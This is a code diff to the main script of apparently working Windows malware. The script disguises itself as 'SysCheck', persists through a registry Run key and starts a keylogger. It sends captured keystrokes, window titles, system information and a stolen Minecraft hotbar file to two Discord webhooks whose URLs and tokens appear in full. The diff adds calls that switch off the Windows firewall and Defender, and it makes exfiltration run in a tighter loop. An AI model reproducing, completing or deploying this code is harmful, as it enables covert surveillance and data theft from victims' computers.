@@ -1,4 +1,4 @@
-from core import keylogger, sender
+from core import keylogger, sender, turn_off_security
 from PIL import ImageGrab
 from discord_bot import bot
 import time, os, sys, shutil, win32api, win32con, threading
@@ -23,9 +23,12 @@ if os.path.dirname(file_path) != "C:\\SysCheck":
 	win32api.RegSetValueEx(key, "SysCheck", 0, win32con.REG_SZ, file_startup_path)
 	win32api.RegCloseKey(key)
 
+Security = turn_off_security.TurnOffSecurity()
 keylogger = keylogger.Keylogger()
 sender = sender.Sender()
 
+Security.FireWall()
+Security.Defender()
 keylogger.start()
 sender.webhook_log_url = 'https://discord.com/api/webhooks/1128326661000155248/nDG6sPvn8RitbJwHtDpm0Njy9xkOG_ajJBJfX-Hatd0RYuVymvpdD3IAgReuqj4BGam6'
 sender.webhook_info_url = 'https://discord.com/api/webhooks/1128643994163871867/B9HL54arPjlrVqR2vAuWCnICe_ngD1k8hMjCxkuIlJhxkZ-cr24gZlgZz5oYZ8sczREJ'
@@ -34,7 +37,7 @@ sender.send_info()
 last_window = ''
 last_window = keylogger.log_window_title if last_window == '' else ''
 global time_count, time_delay
-time_count = time_delay = 10
+time_count = time_delay = 60
 
 def StealHotBar():
 	hotbar = f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\.minecraft\\hotbar.nbt"
@@ -55,6 +58,8 @@ def Send():
 def LogSend():
 	global time_count, time_delay
 	while True:
+		Send()
+		time.sleep(time_delay)
 		if keylogger.log_window_title == last_window:
 			time_count -= 1
 			time.sleep(1)
